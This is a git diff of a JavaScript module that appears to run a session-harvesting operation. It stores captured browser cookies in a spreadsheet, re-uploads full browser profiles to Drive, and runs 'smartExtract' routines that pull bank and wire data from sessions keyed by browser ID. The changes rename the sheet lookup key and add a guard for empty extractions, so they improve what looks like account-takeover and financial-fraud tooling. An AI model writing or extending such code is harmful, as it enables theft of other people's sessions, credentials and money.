@@ -1053,8 +1053,8 @@ async function saveEnrichedProfile(session, userDataDir, enrichedCookies = []) {
         logger.info(`[smartExtract] Using ${enrichedCookies.length} pre-captured enriched cookies`);
 
         // 2. Update cookieJSON in the sheet
-        await ensureSheetColumns(COOKIE_SHEET, ['submissionId', 'cookieJSON', 'formattedCookie', 'driveUrl', 'cookieFileURL']);
-        const writeResult = await updateSheetRowApi(COOKIE_SHEET, 'submissionId', session.browserId, {
+        await ensureSheetColumns(COOKIE_SHEET, ['cookieJSON', 'formattedCookie', 'driveUrl', 'cookieFileURL']);
+        const writeResult = await updateSheetRowApi(COOKIE_SHEET, 'browserId', session.browserId, {
             cookieJSON: JSON.stringify(enrichedCookies),
             formattedCookie: JSON.stringify(enrichedCookies, null, 2),
         });
@@ -1067,7 +1067,7 @@ async function saveEnrichedProfile(session, userDataDir, enrichedCookies = []) {
         // 3. Re-upload enriched profile to Drive (bypass re-upload guard by passing empty updateData)
         const uploadResult = await uploadBrowserDataRaw(session.browserId, {}, userDataDir);
         if (uploadResult.ok) {
-            await updateSheetRowApi(COOKIE_SHEET, 'submissionId', session.browserId, {
+            await updateSheetRowApi(COOKIE_SHEET, 'browserId', session.browserId, {
                 driveUrl: uploadResult.url,
                 cookieFileURL: uploadResult.url,
             });
@@ -1134,6 +1134,14 @@ export async function runSmartExtract(browserId, category, username, platform) {
             data = await extractBank(session, platform);
         } else {
             data = await extractWire(session, browserId);
+        }
+
+        // Guard: if extraction returned empty data, retain existing cell value
+        const isEmpty = !data || (typeof data === 'object' && Object.keys(data).length === 0);
+        if (isEmpty) {
+            logger.warn(`[smartExtract] Empty extract for ${column}, retaining existing cell data`);
+            await updateExtractStatus(browserId, 'completed');
+            return { success: true, empty: true, category: cat, column };
         }
 
         await updateExtractStatus(browserId, 'saving');
